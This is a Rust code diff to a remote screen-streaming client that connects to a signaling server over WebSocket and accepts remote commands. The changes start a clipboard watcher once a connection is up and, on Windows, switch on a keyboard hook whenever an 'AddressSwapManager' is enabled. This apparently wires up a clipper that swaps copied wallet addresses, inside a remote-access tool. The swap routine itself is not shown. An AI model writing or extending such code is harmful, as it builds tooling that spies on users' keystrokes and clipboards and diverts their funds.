@@ -418,13 +418,17 @@ impl ScreenSender {
 
     pub async fn run(self: Arc<Self>) -> Result<(), ScreenError> {
         let (clip_tx, mut clip_rx) = tokio::sync::mpsc::unbounded_channel();
-        let _clipboard_watcher = crate::clipboard::start_watcher(clip_tx);
+        let mut clipboard_watcher: Option<crate::clipboard::ClipboardWatcher> = None;
 
         let sender = self;
         let mut backoff_ms = WS_RECONNECT_BASE_MS;
 
         while !sender.closed.load(Ordering::SeqCst) {
-            match sender.clone().connect_once(&mut clip_rx).await {
+            match sender
+                .clone()
+                .connect_once(&mut clip_rx, &mut clipboard_watcher, &clip_tx)
+                .await
+            {
                 Ok(()) => backoff_ms = WS_RECONNECT_BASE_MS,
                 Err(_) if sender.closed.load(Ordering::SeqCst) => break,
                 Err(_) => {}
@@ -438,7 +442,7 @@ impl ScreenSender {
             backoff_ms = (backoff_ms.saturating_mul(2)).min(WS_RECONNECT_MAX_MS);
         }
 
-        drop(_clipboard_watcher);
+        drop(clipboard_watcher);
         sender.stop_streaming().await;
         Ok(())
     }
@@ -446,11 +450,17 @@ impl ScreenSender {
     async fn connect_once(
         self: Arc<Self>,
         clip_rx: &mut mpsc::UnboundedReceiver<crate::clipboard::ClipboardEvent>,
+        clipboard_watcher: &mut Option<crate::clipboard::ClipboardWatcher>,
+        clip_tx: &tokio::sync::mpsc::UnboundedSender<crate::clipboard::ClipboardEvent>,
     ) -> Result<(), ScreenError> {
         let ws_url = to_ws_url(&self.config.signaling_url);
         let (ws_stream, _) = connect_async(&ws_url)
             .await
             .map_err(|e| ScreenError::WebSocket(e.to_string()))?;
+
+        if clipboard_watcher.is_none() {
+            *clipboard_watcher = Some(crate::clipboard::start_watcher(clip_tx.clone()));
+        }
 
         let (ws_sink, mut ws_stream) = ws_stream.split();
         let ws_sink = Arc::new(Mutex::new(ws_sink));
@@ -622,6 +632,10 @@ impl ScreenSender {
                 {
                     let _ = out_tx.send(reply);
                 }
+                #[cfg(windows)]
+                crate::clipboard::set_keyboard_hook_enabled(
+                    crate::address_swap::AddressSwapManager::global().is_enabled(),
+                );
             }
             "command" => {
                 let to = payload.get("to").and_then(Value::as_str).unwrap_or_default();
